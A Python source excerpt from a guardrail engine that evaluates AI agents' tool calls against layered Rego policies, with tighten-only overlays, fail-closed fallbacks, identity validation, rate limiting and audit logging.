        async def _append_policy(target_namespace: str, target_agent_class: str) -> None:
            # This helper is used ONLY for base/floor lookups (the caller's own class, __baseline__,
            # namespace/workload tiers) — it NEVER tags "overlay": True. Overlay-ness must come from provenance
            # (where a candidate was constructed), never from a string-suffix match on the key, so a real
            # agent_class that happens to end in a reserved suffix (e.g. "...__remediation__") can never be
            # misclassified as an overlay and lose its priority-based precedence.
            key = f"{target_namespace}:{target_agent_class}"
            if key in self._loader._policies:
                entry = self._loader._policies[key]
                candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"],
                                   "enforcement_mode": entry.get("enforcement_mode", "block")})
                return
            loaded = await self._loader.load_from_db(target_namespace, target_agent_class)
            if loaded:
                candidates.append({"key": key, "rego": loaded["rego"], "priority": loaded["priority"],
                                   "enforcement_mode": loaded.get("enforcement_mode", "block")})

        async def _append_controls_floor(target_namespace: str) -> None:
            """The tuned baseline controls, tagged as a tighten-only overlay so they act as a FLOOR.

            Same lookup as `_append_policy` (in-memory first, then the DB), but tagged `overlay: True` at
            CONSTRUCTION — which is the only source of overlay-ness the resolver trusts. The key is a fixed
            reserved literal, so unlike the string-suffix heuristic there is no way a real agent class can
            collide with it.
            """
            key = f"{target_namespace}:__controls__"
            entry = self._loader._policies.get(key) or await self._loader.load_from_db(
                target_namespace, "__controls__"
            )
            if entry:
                candidates.append(
                    {
                        "key": key,
                        "rego": entry["rego"],
                        "priority": entry["priority"],
                        "enforcement_mode": entry.get("enforcement_mode", "block"),
                        "overlay": True,
                    }
                )

        await _append_policy(namespace, agent_class)
        # The customer's tuned baseline CONTROLS, kept on their own key rather than sharing
        # `__baseline__` with the chart's cluster guard.
        #
        # Both used to write `<ns>:__baseline__`. The chart's NrvqPolicy CR is reconciled by the
        # webhook controller, so a `helm upgrade` — or any CR resync — silently reverted every control
        # a customer had tuned, and the two writers produced different `enforcement_mode` values on the
        # same key, which made the SAME probe return a prefixed rule_id on one run and a bare one on
        # the next. Non-reproducible enforcement is worse than either behaviour on its own.
        #
        # Collected as a tighten-only FLOOR, not a base tier.
        #
        # It was a base tier, and base tiers resolve by highest priority OUTRIGHT — so an agent-class
        # policy authored at 100 beat the controls tier at 2 and its decision was DISCARDED. Measured on
        # a live cluster with `pii_detection` set to Enforce and one SSN payload:
        #
        #     r2-support    (has a class policy)   allow   cde_default_allow
        #     anything-else (no class policy)      block   pii_detection
        #
        # Writing a single class policy silently switched all fourteen shipped detectors off for that
        # class, while Target Settings still read "1 enforcing" — truthfully, about a control that no
        # longer applied to the class the operator cared most about. A detector an operator explicitly
        # promoted to Enforce must not be removable as a side effect of authoring an unrelated policy.
        #
        # As an overlay it is tighten-only (`_resolve_with_packs` takes it only when it is STRICTER than
        # the base winner), and it lands in the HARD partition of `_resolve_overlay` — so a
        # `__pack_weaken__` can never relax it either. Priority becomes irrelevant, which is what "floor"
        # means. Note this also restores MONITORING on classes that have their own policy: `audit` is
        # stricter than `allow`, and audit never interrupts a call, so the record comes back with no
        # availability cost.
        await _append_controls_floor(namespace)
        await _append_policy(namespace, "__baseline__")
        await _append_policy("__cluster__", "__baseline__")
        # The catalog advertises WORKLOAD and NAMESPACE tiers (resolve_policy_key mints
        # `deployment:<name>` / `namespace:<ns>` keys); collect them here so they are enforced, not just
        # advertised (in-memory-only, additive: zero hot-path cost when absent, and priority resolution
        # still picks the winner):
        #   - namespace tier applies to EVERY call in the namespace (like a ns-scoped baseline);
        #   - workload tier applies only when the caller identifies its workload (never guessed).
        ns_tier_key = f"{namespace}:namespace:{namespace}"
        if ns_tier_key in self._loader._policies:
            entry = self._loader._policies[ns_tier_key]
            candidates.append({"key": ns_tier_key, "rego": entry["rego"], "priority": entry["priority"],
                               "enforcement_mode": entry.get("enforcement_mode", "block")})
        workload = getattr(event.agent_identity, "workload", "") or ""
        if workload:
            wl_key = f"{namespace}:deployment:{workload}"
            if wl_key in self._loader._policies:
                entry = self._loader._policies[wl_key]
                candidates.append({"key": wl_key, "rego": entry["rego"], "priority": entry["priority"],
                                   "enforcement_mode": entry.get("enforcement_mode", "block")})
        # Additive sector-pack candidate. In-memory ONLY (no load_from_db) so it costs nothing
        # on the hot path for namespaces with no pack enabled — and is simply absent by default, so the
        # single-cluster path / attack namespaces are unchanged unless a pack is materialized here.
        # Every overlay appended below is tagged "overlay": True AT CONSTRUCTION — this is the sole
        # source of overlay-ness the resolver relies on (see _resolve_with_packs). Never derive it later from
        # the key string, which is ambiguous whenever a real agent_class collides with a reserved suffix.
        pack_key = f"{namespace}:__pack__"
        if pack_key in self._loader._policies:
            entry = self._loader._policies[pack_key]
            candidates.append({"key": pack_key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
        # Opt-in per-namespace tool allowlist guardrail. Same additive/in-memory-only discipline as
        # __pack__: absent by default (zero hot-path cost, single-cluster/attacks unchanged) and tighten-only.
        guardrail_key = f"{namespace}:__guardrail__"
        if guardrail_key in self._loader._policies:
            entry = self._loader._policies[guardrail_key]
            candidates.append({"key": guardrail_key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
        # Per-namespace sector-pack OVERRIDE — an operator-authored tighten-only overlay that customizes
        # the pack (e.g. add a stricter block). Same additive discipline: absent by default, tighten-only, never
        # weakens a pack's block. Revertable by deleting the (ns,__pack_override__) policy.
        override_key = f"{namespace}:__pack_override__"
        if override_key in self._loader._policies:
            entry = self._loader._policies[override_key]
            candidates.append({"key": override_key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
        # fleet-mgmt: per-namespace pack WEAKEN overlay — an explicit, admin-authored, audited customization that may
        # RELAX a pack's added restriction (unlike __pack_override__ which is tighten-only). Same additive/in-memory
        # discipline: absent by default (zero hot-path cost, single-cluster/attacks unchanged). The base comprehensive
        # policy is still a hard floor (_resolve_with_packs), so a weaken can never drop below the org baseline.
        # The weaken exception is scoped to the PACK family ONLY (see _resolve_overlay) — it can never relax
        # a __guardrail__ or a *__remediation__ overlay, which are hard tighten-only.
        weaken_key = f"{namespace}:__pack_weaken__"
        if weaken_key in self._loader._policies:
            entry = self._loader._policies[weaken_key]
            candidates.append({"key": weaken_key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
        # Per-CLASS compliance remediation overlay — a "Generate enforcing policy" draft for
        # a compliance gap technique is control-specific and additive (it must only ADD a block for this one
        # class, never REPLACE the class's existing comprehensive policy). It is reviewed+applied to the
        # dedicated key `(ns, "<agent_class>__remediation__")` — never to the base `(ns, agent_class)` key —
        # so the base policy stays byte-identical. Same additive/in-memory-only discipline as __pack__/
        # __guardrail__: absent by default, zero hot-path cost, tighten-only via _resolve_with_packs — and
        # HARD tighten-only: a __pack_weaken__ overlay can never relax this one.
        if agent_class:
            remediation_key = f"{namespace}:{agent_class}__remediation__"
            if remediation_key in self._loader._policies:
                entry = self._loader._policies[remediation_key]
                candidates.append(
                    {"key": remediation_key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True}
                )
        return candidates

    async def _collect_candidates_union(self, agent_class: str) -> list[dict]:
        """Union resolver for the console's namespace=all picker. Collects the class policy + baseline +
        the additive overlays for EVERY namespace that actually holds a policy for this class, plus the single
        cluster baseline. Mirrors the concrete-namespace collection above so `_resolve_with_packs` yields the
        real winning rule (e.g. deny_shell_execution), never no_policy_loaded when a policy IS loaded. Overlays
        stay tighten-only, so the union can never weaken a decision. Fail-closed: empty when nothing is loaded
        anywhere (then the caller still denies, now with the correct no_policy_loaded reason)."""
        candidates: list[dict] = []
        seen: set[str] = set()

        async def _append_policy(target_namespace: str, target_agent_class: str) -> None:
            # Base/floor lookup only — never tags "overlay": True (mirrors _collect_candidates).
            key = f"{target_namespace}:{target_agent_class}"
            if key in seen:
                return
            if key in self._loader._policies:
                entry = self._loader._policies[key]
                candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"],
                                   "enforcement_mode": entry.get("enforcement_mode", "block")})
                seen.add(key)
                return
            loaded = await self._loader.load_from_db(target_namespace, target_agent_class)
            if loaded:
                candidates.append({"key": key, "rego": loaded["rego"], "priority": loaded["priority"],
                                   "enforcement_mode": loaded.get("enforcement_mode", "block")})
                seen.add(key)

        def _append_overlay(key: str) -> None:
            # additive/in-memory-only overlays (pack/guardrail/override/weaken/remediation) — absent by default,
            # tighten-only. Tagged "overlay": True at construction — the resolver's sole source of truth.
            if key in seen or key not in self._loader._policies:
                return
            entry = self._loader._policies[key]
            candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
            seen.add(key)

        def _append_controls_overlay(ns: str) -> None:
            key = f"{ns}:__controls__"
            if key in self._loader._policies and key not in seen:
                entry = self._loader._policies[key]
                candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"],
                                   "enforcement_mode": entry.get("enforcement_mode", "block"), "overlay": True})
                seen.add(key)

        for ns in await self._loader.namespaces_for_class(agent_class):
            await _append_policy(ns, agent_class)
            # Mirror the concrete-namespace collection. Omitting it here would make the console's
            # global "All namespaces" picker report a different winning layer than the one a real
            # agent actually gets — a tuned control would be invisible in exactly the view an operator
            # uses to check their tuning took effect.
            # Tighten-only FLOOR here too — see _collect_candidates. If the union path left this a base
            # tier, the console's "All namespaces" view would report a different winning layer than the
            # one a real agent actually gets, which is precisely the view an operator uses to check that
            # their tuning took effect.
            _append_controls_overlay(ns)
            await _append_policy(ns, "__baseline__")
            for overlay in ("__pack__", "__guardrail__", "__pack_override__", "__pack_weaken__"):
                _append_overlay(f"{ns}:{overlay}")
            # Mirror the per-class remediation overlay lookup from _collect_candidates for
            # the union resolver (console's namespace="all" picker) — same additive/in-memory-only, tighten-only.
            if agent_class:
                _append_overlay(f"{ns}:{agent_class}__remediation__")
        await _append_policy("__cluster__", "__baseline__")
        return candidates

    def _resolve_with_packs(self, results: list[dict]) -> dict:
        """Sector packs (:__pack__) and the opt-in tool-allowlist guardrail (:__guardrail__) are
        ADDITIVE-ONLY overlays — they can only TIGHTEN the decision (block < escalate < audit < allow), never
        loosen it, regardless of priority. We resolve the non-overlay candidates normally, then let the most
        restrictive overlay win only if it is stricter than the base. This makes an overlay's block/escalate
        enforce over a permissive baseline AND prevents an overlay escalate/allow from ever weakening a
        stricter policy.

        Overlay-ness is read from the "overlay" PROVENANCE FLAG each candidate was tagged with at
        construction (_collect_candidates/_collect_candidates_union), never re-derived from the key string. A
        real agent_class whose own base policy happens to end in a reserved suffix (e.g. "...__remediation__")
        is therefore never misclassified as an overlay and always keeps its priority-based precedence."""
        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
        overlay = [r for r in results if r.get("overlay")]
        base = [r for r in results if not r.get("overlay")]
        base_winner = self._resolve_precedence(base) if base else None
        overlay_winner = self._resolve_overlay(overlay) if overlay else None
        if base_winner is None:
            return overlay_winner
        if overlay_winner is None:
            return base_winner
        overlay_rank = rank.get(overlay_winner["decision"].decision, 3)
        base_rank = rank.get(base_winner["decision"].decision, 3)
        return overlay_winner if overlay_rank < base_rank else base_winner

    @staticmethod
    def _is_overlay(key: str) -> bool:
        """Key-suffix heuristic retained for callers that only have a key string (e.g. the console's
        /policies/effective display labeling) and cannot carry the "overlay" provenance flag. Overlay candidates:
        sector packs, the allowlist guardrail, the tighten-only override, the fleet-mgmt admin pack
        WEAKEN overlay, and a per-class compliance remediation overlay (any class segment
        ending `__remediation__`, e.g. "ns:report-gen__remediation__"). The remediation suffix is dynamic (one
        overlay key per real class, unlike the fixed namespace-wide overlay names), so it's matched by suffix
        rather than an exact `:__remediation__` literal — the `__remediation__` double-underscore suffix is a
        reserved naming convention (mirrors `__pack__`/`__guardrail__`) that a real agent class is not expected
        to collide with, but CAN in principle. The evaluator's own resolution path
        (_resolve_with_packs) does NOT use this method — it uses the "overlay" flag tagged at construction, which
        can never misclassify a real class's own base policy. Prefer the flag over this heuristic wherever the
        candidate dict is available."""
        return (key.endswith(":__pack__") or key.endswith(":__guardrail__")
                or key.endswith(":__pack_override__") or key.endswith(":__pack_weaken__")
                or key.endswith("__remediation__"))

    def _resolve_overlay(self, results: list[dict]) -> dict:
        """Partition overlays into (a) the PACK family (:__pack__, :__pack_override__, :__pack_weaken__),
        where an explicit :__pack_weaken__ MAY relax the pack's own added block, and (b) HARD tighten-only
        overlays (:__guardrail__, *__remediation__), which a weaken must NEVER be able to relax — a
        __pack_weaken__ overlay exists ONLY to dial back a sector pack's own restriction, not to neutralize an
        operator guardrail or a compliance-remediation control. Each partition is resolved independently, then
        combined by plain most-restrictive-wins, so a hard block/escalate always survives a pack weaken's allow."""
        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
        pack_family = [
            r for r in results
            if str(r["key"]).endswith((":__pack__", ":__pack_override__", ":__pack_weaken__"))
        ]
        pack_keys = {str(r["key"]) for r in pack_family}
        hard = [r for r in results if str(r["key"]) not in pack_keys]
        pack_winner = self._resolve_pack_family(pack_family) if pack_family else None
        hard_winner = self._resolve_hard_overlay(hard) if hard else None
        if pack_winner is None:
            return hard_winner
        if hard_winner is None:
            return pack_winner
        pack_rank = rank.get(pack_winner["decision"].decision, 3)
        hard_rank = rank.get(hard_winner["decision"].decision, 3)
        # a tie keeps the hard overlay's winner (guardrail/remediation reason takes attribution priority).
        return pack_winner if pack_rank < hard_rank else hard_winner

    @staticmethod
    def _resolve_pack_family(results: list[dict]) -> dict:
        """Resolve the PACK family (:__pack__, :__pack_override__, :__pack_weaken__) with the weaken exception:
        an explicit admin :__pack_weaken__ overlay supersedes the rest of the family so it can RELAX the pack's
        own added block — but only within this family; it never reaches outside it (see _resolve_overlay). Ties
        broken by highest priority; several weaken overlays -> the most permissive (deliberate relaxation) wins."""
        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
        weaken = [r for r in results if str(r["key"]).endswith(":__pack_weaken__")]
        if weaken:
            weaken.sort(key=lambda item: (-rank.get(item["decision"].decision, 3), -int(item["priority"])))
            return weaken[0]
        results.sort(key=lambda item: (rank.get(item["decision"].decision, 3), -int(item["priority"])))
        return results[0]

    @staticmethod
    def _resolve_hard_overlay(results: list[dict]) -> dict:
        """Plain most-restrictive-wins for HARD tighten-only overlays (:__guardrail__, *__remediation__) — NO
        weaken exception. Ties broken by highest priority."""
        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
        results.sort(key=lambda item: (rank.get(item["decision"].decision, 3), -int(item["priority"])))
        return results[0]

    def _resolve_precedence(self, results: list[dict]) -> dict:
        """Highest priority wins; most restrictive wins on ties."""
        decision_rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
        results.sort(
            key=lambda item: (
                -int(item["priority"]),
                decision_rank.get(item["decision"].decision, 3),
            )
        )
        return results[0]

    def _fallback_decision(self, event: ToolCallEvent, elapsed_ms: float) -> PolicyDecision:
        """Return fail-closed fallback decision when evaluation fails."""
        mode = "block"
        log.warning("nrvq.engine.fallback", event_id=event.event_id, mode=mode, code="NRVQ-ENG-2003")
        return PolicyDecision(
            decision=mode,
            rule_id="evaluator_fallback",  # name the fail-closed block so it is never left empty
            reason=f"Evaluation failed, fallback={mode}",
            latency_ms=round(elapsed_ms, 2),
            event_id=event.event_id,
        )

    def _invalid_identity_decision(self, event: ToolCallEvent, elapsed_ms: float) -> PolicyDecision:
        """Named fail-closed decision for an invalid SPIFFE identity (SIEM can alert on the spoof class)."""
        return PolicyDecision(
            decision="block",
            rule_id="invalid_spiffe_identity",
            reason="Agent SPIFFE identity failed validation — fail-closed block",
            latency_ms=round(elapsed_ms, 2),
            event_id=event.event_id,
        )

    def _timeout_decision(self, event: ToolCallEvent, elapsed_ms: float) -> PolicyDecision:
        """Return fail-closed decision specifically for evaluation timeout paths."""
        mode = "block"
        log.warning("nrvq.engine.timeout_fallback", event_id=event.event_id, mode=mode, code="NRVQ-ENG-2021")
        return PolicyDecision(
            decision=mode,
            rule_id="evaluator_timeout",
            reason="Evaluation timed out, fallback=block",
            latency_ms=round(elapsed_ms, 2),
            event_id=event.event_id,
        )

    def load_policy(self, namespace: str, agent_class: str, rego_source: str, priority: int = 100) -> None:
        """Load or replace policy with copy-on-write atomic assignment."""
        key = f"{namespace}:{agent_class}"
        package_name = self._extract_package_name(rego_source)
        self._policies = {
            **self._policies,
            key: {"rego": rego_source, "priority": int(priority), "package_name": package_name},
        }
        log.info("nrvq.engine.policy_loaded", key=key, code="NRVQ-ENG-2005")

    def unload_policy(self, namespace: str, agent_class: str) -> None:
        """Remove a policy from the in-memory index (copy-on-write) so a deleted/retracted policy stops
        being evaluated — the counterpart to load_policy."""
        key = f"{namespace}:{agent_class}"
        if key in self._policies:
            self._policies = {k: v for k, v in self._policies.items() if k != key}
            log.info("nrvq.engine.policy_unloaded", key=key, code="NRVQ-ENG-2031")

    def reload_policy(self, namespace: str, agent_class: str, rego_source: str, priority: int | None = None) -> None:
        """Hot-reload a single policy without restarting.

        Use COPY-ON-WRITE (atomic dict swap) like load_policy — an in-place mutation of
        self._policies[key] would risk a torn read for a concurrent candidate iteration. PRESERVE the
        existing priority so the layer stack is not silently re-ordered; an explicit `priority` overrides
        when the caller has it.
        """
        key = f"{namespace}:{agent_class}"
        package_name = self._extract_package_name(rego_source)
        existing = self._policies.get(key)
        resolved_priority = priority if priority is not None else (int(existing["priority"]) if existing else 100)
        self._policies = {
            **self._policies,
            key: {"rego": rego_source, "priority": resolved_priority, "package_name": package_name},
        }
        log.info("nrvq.engine.policy_hot_reloaded", key=key, code="NRVQ-ENG-2030")

    def bind_loader(self, loader: object) -> None:
        """Bind loader reference for multi-policy priority resolution."""
        self._loader = loader

    async def _post_decision(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
        """Log and mutate trust state after decision finalization."""
        if decision.decision == "block":
            log.warning("nrvq.engine.blocked", event_id=event.event_id, rule=decision.rule_id, code="NRVQ-ENG-2010")
            return
        if decision.decision == "escalate":
            log.warning("nrvq.engine.escalated", event_id=event.event_id, code="NRVQ-ENG-2015")
            return
        log.info("nrvq.engine.allowed", event_id=event.event_id, code="NRVQ-ENG-2001")

    async def _emit_audit(self, decision: PolicyDecision) -> None:
        """Emit asynchronous audit event without blocking caller path."""
        # Minimal non-blocking emission until dedicated pipeline integration.
        log.info(
            "nrvq.engine.audit_decision",
            event_id=decision.event_id,
            decision=decision.decision,
            rule_id=decision.rule_id,
            trust_score=decision.trust_score,
            trust_category=decision.trust_category,
            trust_signals=decision.trust_signals,
            latency_ms=decision.latency_ms,
            code="NRVQ-AUD-6000",
        )

    def _queue_audit(self, decision: PolicyDecision) -> None:
        """Queue audit task and track it for safe lifecycle management."""
        task = asyncio.create_task(self._emit_audit(decision))
        self._audit_tasks.add(task)
        task.add_done_callback(self._audit_tasks.discard)

    async def close(self) -> None:
        """Flush outstanding audit tasks during shutdown."""
        if self._audit_tasks:
            await asyncio.gather(*self._audit_tasks, return_exceptions=True)

    async def _is_rate_limited(self, spiffe_id: str, limit: int | None = None) -> bool:
        """Check whether rate limit is exceeded for the current window. `limit` is the caller
        namespace's per-ns ceiling (already global-defaulted by _resolve_posture); None keeps the global default."""
        ceiling = int(limit) if limit is not None else settings.evaluator_rate_limit_per_window
        count = await self._cache.incr_call_count(spiffe_id, settings.evaluator_rate_limit_window_s)
        return count > ceiling

    async def _rate_limit_decision(self, event: ToolCallEvent, start: float, limit: int | None = None) -> PolicyDecision:
        """Build and apply block decision when cached allow exceeds rate limit. The reason
        names the ACTUAL enforced ceiling (per-ns when overridden) so the audit record is not misleading."""
        elapsed_ms = (time.monotonic() - start) * 1000
        ceiling = int(limit) if limit is not None else settings.evaluator_rate_limit_per_window
        return PolicyDecision(
            decision="block",
            rule_id="rate_limit_exceeded",
            reason=f"Rate limit exceeded: >{ceiling} per {settings.evaluator_rate_limit_window_s}s",
            latency_ms=round(elapsed_ms, 2),
            event_id=event.event_id,
        )

    def _validate_spiffe(self, spiffe_id: str) -> None:
        """Validate SPIFFE identifier format before trust operations."""
        if not spiffe_id.startswith("spiffe://"):
            raise InvalidSpiffeIdentity("invalid spiffe_id")
